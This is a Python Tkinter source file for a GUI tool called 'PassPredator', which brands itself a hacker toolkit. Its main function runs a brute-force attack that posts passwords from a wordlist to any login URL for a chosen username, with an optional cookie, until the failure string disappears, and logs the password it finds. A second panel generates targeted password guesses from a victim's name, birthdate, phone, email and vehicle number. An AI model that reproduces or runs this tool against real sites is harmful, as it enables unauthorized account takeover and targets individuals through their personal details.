import tkinter as tk
from tkinter import filedialog, scrolledtext, ttk
from AI_mask_attack import generate_passwords
import threading
import requests
import datetime

# Initialize Tkinter Window
root = tk.Tk()
root.title("PassPredator - Cyber Security Toolkit")
root.geometry("700x500")
root.configure(bg="#1e1e1e")  # Dark background

dark_mode = False


# Header
header_frame = tk.Frame(root, bg="#9c0606", padx=10, pady=5)
header_frame.pack(fill=tk.X)

header_label = tk.Label(header_frame, text="Welcome to The - PassPredator - Hacker Toolkit", font=("Arial", 14, "bold"), bg="#9c0606", fg="white")
header_label.pack()


# Function to Save Logs
def save_logs():
    log_content = log_output.get("1.0", tk.END).strip()
    if not log_content:
        log_output.insert(tk.END, "[INFO] No logs to save.\n", "info")
        return
    
    with open("attack_logs.txt", "a") as log_file:
        log_file.write(f"\n=== Log Session ({datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}) ===\n")
        log_file.write(log_content + "\n")
    
    log_output.insert(tk.END, "[INFO] Logs saved to attack_logs.txt\n", "info")

# Function to Update Status
def update_status(new_status, color):
    status_label.config(text=f"Status: {new_status}", fg=color)

# Loading Animation Function
def animate_loading():
    if status_label.cget("text").startswith("Status: Running"):
        current_text = status_label.cget("text")
        if current_text.endswith("..."):
            status_label.config(text="Status: Running")
        else:
            status_label.config(text=current_text + ".")
        root.after(500, animate_loading)

# File Selection Function
def select_wordlist():
    file_path = filedialog.askopenfilename(title="Select Wordlist", filetypes=[("Text Files", "*.txt")])
    if file_path:
        wordlist_entry.delete(0, tk.END)
        wordlist_entry.insert(0, file_path)

# Attack Function
def start_attack():
    login_url = login_url_entry.get()
    username = username_entry.get()
    wordlist = wordlist_entry.get()
    fail_string = fail_string_entry.get()
    cookie_value = cookie_entry.get()

    if not login_url or not username or not wordlist or not fail_string:
        log_output.insert(tk.END, "[ERROR] Missing required fields!\n", "error")
        return

    update_status("Running...", "red")
    animate_loading()
    log_output.insert(tk.END, f"[INFO] Starting attack on {login_url} for user {username}\n", "info")

    attack_thread = threading.Thread(target=run_attack, args=(login_url, username, wordlist, fail_string, cookie_value))
    attack_thread.start()

# Brute Force Attack Logic
def run_attack(login_url, username, wordlist, fail_string, cookie_value):
    headers = {"Cookie": cookie_value} if cookie_value else {}

    try:
        with open(wordlist, "r") as f:
            for password in f:
                password = password.strip()
                log_entry = f"Trying: {password}\n"
                log_output.insert(tk.END, log_entry, "attempt")
                log_output.see(tk.END)

                with open("attack_logs.txt", "a") as log_file:
                    log_file.write(log_entry)

                response = requests.post(login_url, data={"username": username, "password": password}, headers=headers)

                if fail_string not in response.text:
                    success_msg = f"[SUCCESS] Password found: {password}\n"
                    log_output.insert(tk.END, success_msg, "success")

                    with open("attack_logs.txt", "a") as log_file:
                        log_file.write(success_msg)

                    update_status("Completed", "green")
                    return

        update_status("Completed", "green")
    except Exception as e:
        error_msg = f"[ERROR] {str(e)}\n"
        log_output.insert(tk.END, error_msg, "error")

        with open("attack_logs.txt", "a") as log_file:
            log_file.write(error_msg)

        update_status("Error", "red")

# Dark Mode Toggle
def toggle_dark_mode():
    global dark_mode
    dark_mode = not dark_mode

    if dark_mode:
        root.config(bg="black")
        status_label.config(bg="black", fg="lime")
        log_output.config(bg="black", fg="lime")

        for widget in frame.winfo_children():
            if isinstance(widget, tk.Label):
                widget.config(bg="black", fg="lime")
            elif isinstance(widget, tk.Entry):
                widget.config(bg="gray20", fg="white", insertbackground="white")
            elif isinstance(widget, tk.Button):
                widget.config(bg="gray25", fg="white", activebackground="gray40", activeforeground="lime")

    else:
        root.config(bg="#1e1e1e")
        status_label.config(bg="#1e1e1e", fg="white")
        log_output.config(bg="#252526", fg="lightgray")

        for widget in frame.winfo_children():
            if isinstance(widget, tk.Label):
                widget.config(bg="#1e1e1e", fg="white")
            elif isinstance(widget, tk.Entry):
                widget.config(bg="white", fg="black", insertbackground="black")
            elif isinstance(widget, tk.Button):
                widget.config(bg="#C15BFF", fg="black", activebackground="#A020F0", activeforeground="white")

#ai mask attack
def generate_ai_passwords():
    details = {
        "name": name_entry.get(),
        "birthdate": birthdate_entry.get(),
        "phone": phone_entry.get(),
        "email": email_entry.get(),
        "vehicle": vehicle_entry.get()
    }
    passwords = generate_passwords(details["name"], details["birthdate"], details["phone"], details["email"], details["vehicle"])
    
    password_output.delete("1.0", tk.END)  # Clear previous output
    for pwd in passwords:
        password_output.insert(tk.END, pwd + "\n")


# ui of ai mask attack
# AI Password Guessing (Left Side)
ai_frame = tk.Frame(root, bg="#1e1e1e", padx=10, pady=10)
ai_frame.pack(side=tk.LEFT, fill=tk.Y)

tk.Label(ai_frame, text="Target Name:", bg="#1e1e1e", fg="white").pack()
name_entry = tk.Entry(ai_frame, width=30)
name_entry.pack()

tk.Label(ai_frame, text="Birthdate (YYYY-MM-DD):", bg="#1e1e1e", fg="white").pack()
birthdate_entry = tk.Entry(ai_frame, width=30)
birthdate_entry.pack()

tk.Label(ai_frame, text="Phone Number:", bg="#1e1e1e", fg="white").pack()
phone_entry = tk.Entry(ai_frame, width=30)
phone_entry.pack()

tk.Label(ai_frame, text="Email ID:", bg="#1e1e1e", fg="white").pack()
email_entry = tk.Entry(ai_frame, width=30)
email_entry.pack()

tk.Label(ai_frame, text="Vehicle No:", bg="#1e1e1e", fg="white").pack()
vehicle_entry = tk.Entry(ai_frame, width=30)
vehicle_entry.pack()

# Button to Generate AI Passwords
tk.Button(ai_frame, text="Generate AI Passwords", command=generate_ai_passwords, bg="#C15BFF", fg="black").pack(pady=5)

# Output Box for AI Passwords
password_output = scrolledtext.ScrolledText(ai_frame, width=30, height=10, bg="#252526", fg="lightgray", font=("Consolas", 10))
password_output.pack()

# UI Layout
frame = tk.Frame(root, bg="#1e1e1e", padx=10, pady=10)
frame.pack(fill=tk.BOTH, expand=True)

tk.Label(frame, text="Login Page URL:", bg="#1e1e1e", fg="white", font=("Arial", 10)).pack()
login_url_entry = tk.Entry(frame, width=50)
login_url_entry.pack()

tk.Label(frame, text="Username:", bg="#1e1e1e", fg="white", font=("Arial", 10)).pack()
username_entry = tk.Entry(frame, width=40)
username_entry.pack()

tk.Label(frame, text="Wordlist File:", bg="#1e1e1e", fg="white", font=("Arial", 10)).pack()
wordlist_entry = tk.Entry(frame, width=30)
wordlist_entry.pack()
tk.Button(frame, text="Browse", command=select_wordlist, bg="#C15BFF", fg="black", activebackground="#A020F0", activeforeground="white").pack()

tk.Label(frame, text="Failure Response String:", bg="#1e1e1e", fg="white", font=("Arial", 10)).pack()
fail_string_entry = tk.Entry(frame, width=50)
fail_string_entry.pack()

tk.Label(frame, text="Cookie (Optional):", bg="#1e1e1e", fg="white", font=("Arial", 10)).pack()
cookie_entry = tk.Entry(frame, width=50)
cookie_entry.pack()

# Buttons
button_frame = tk.Frame(frame, bg="#1e1e1e")
button_frame.pack(pady=10)

def create_button(text, command):
    btn = tk.Button(button_frame, text=text, font=("Arial", 10, "bold"), bg="#C15BFF", fg="black",
                    activebackground="#A020F0", activeforeground="white", relief="flat", bd=5, padx=10, pady=5, command=command)
    btn.pack(side=tk.LEFT, padx=5)
    return btn

start_btn = create_button("Start Attack", start_attack)
save_logs_btn = create_button("Save Logs", save_logs)
exit_btn = create_button("Exit", root.quit)
dark_mode_btn = create_button("Dark Mode", toggle_dark_mode)

# Status Indicator
status_label = tk.Label(frame, text="Status: Idle", font=("Arial", 12, "bold"), bg="#1e1e1e", fg="white")
status_label.pack(pady=10)

# Log Output
log_output = scrolledtext.ScrolledText(frame, width=80, height=20, bg="#252526", fg="lightgray", font=("Consolas", 10))
log_output.pack()

# Footer
footer_frame = tk.Frame(root, bg="#C15BFF", padx=10, pady=5)
footer_frame.pack(fill=tk.X, side=tk.BOTTOM)  # Ensures it stays at the bottom and stretches

footer_label = tk.Label(footer_frame, text="Developed by Hunter001x - (Aayush)", font=("Arial", 12, "bold", "italic"), bg="#C15BFF", fg="black")
footer_label.pack(pady=5)

root.mainloop()